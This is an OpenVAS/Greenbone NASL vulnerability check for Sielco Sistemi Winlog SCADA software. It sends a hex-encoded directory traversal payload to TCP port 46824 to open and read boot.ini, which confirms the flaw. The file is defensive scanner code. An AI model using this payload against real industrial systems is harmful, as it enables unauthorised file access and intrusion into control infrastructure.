# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802879");
  script_version("2023-07-25T05:05:58+0000");
  script_cve_id("CVE-2012-4353", "CVE-2012-4354", "CVE-2012-4355", "CVE-2012-4356",
                "CVE-2012-4357", "CVE-2012-4358", "CVE-2012-4359");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2023-07-25 05:05:58 +0000 (Tue, 25 Jul 2023)");
  script_tag(name:"creation_date", value:"2012-06-28 12:12:09 +0530 (Thu, 28 Jun 2012)");
  script_name("Sielco Sistemi Winlog Multiple Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("General");
  script_dependencies("find_service.nasl", "os_detection.nasl");
  script_require_ports(46824);
  script_mandatory_keys("Host/runs_windows");

  script_xref(name:"URL", value:"http://secunia.com/advisories/49395");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/54212");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/19409");
  script_xref(name:"URL", value:"http://aluigi.altervista.org/adv/winlog_2-adv.txt");
  script_xref(name:"URL", value:"http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-12-179-01.pdf");
  script_xref(name:"URL", value:"http://bot24.blogspot.in/2012/06/sielco-sistemi-winlog-20716-multiple.html");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to obtain sensitive
  information cause buffer overflow condition or execute arbitrary code under
  the context of the user.");

  script_tag(name:"affected", value:"Sielco Sistemi Winlog version 2.07.16 and prior.");

  script_tag(name:"insight", value:"- Multiple errors in RunTime.exe and TCPIPS_Story.dll when
  processing a specially crafted packet sent to TCP port 46824.

  - An input validation error when processing certain user supplied inputs
  allows attackers to write arbitrary files via directory traversal attacks.");

  script_tag(name:"solution", value:"Upgrade to version 2.07.17 or higher.");

  script_tag(name:"summary", value:"Sielco Sistemi Winlog is prone to multiple vulnerabilities.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"http://www.sielcosistemi.com/en/products/winlog_scada_hmi");
  exit(0);
}

include("host_details.inc");

port = 46824;
if(!get_port_state(port)){
  exit(0);
}

soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

# nb: Payload with opcode 0x78 (to open file) followed by ../../boot.ini
payload = raw_string(crap(data:raw_string(0x00), length: 20),
                     0x78, 0x2e, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f,
                     0x2e, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2e,
                     0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2e, 0x2e,
                     0x2f, 0x2e, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f,
                     0x2e, 0x2e, 0x2f, 0x62, 0x6f, 0x6f, 0x74,
                     0x2e, 0x69, 0x6e, 0x69, 0x00, 0x00, 0x00,
                     0x00, 0x00);

send(socket:soc, data: payload);
res = recv(socket:soc, length:200);

if (!res || hexstr(res) !~ "^78") {
  close(soc);
  exit(0);
}

#nb: opcode 0x98 (to read file content)
readData = raw_string(crap(data:raw_string(0x00), length: 20), 0x98,
                      crap(data:raw_string(0x00), length: 10));

send(socket:soc, data: readData);
res = recv(socket:soc, length:200);
close(soc);

if (res && "[boot loader]" >< res  && "WINDOWS" >< res){
  security_message(port);
}
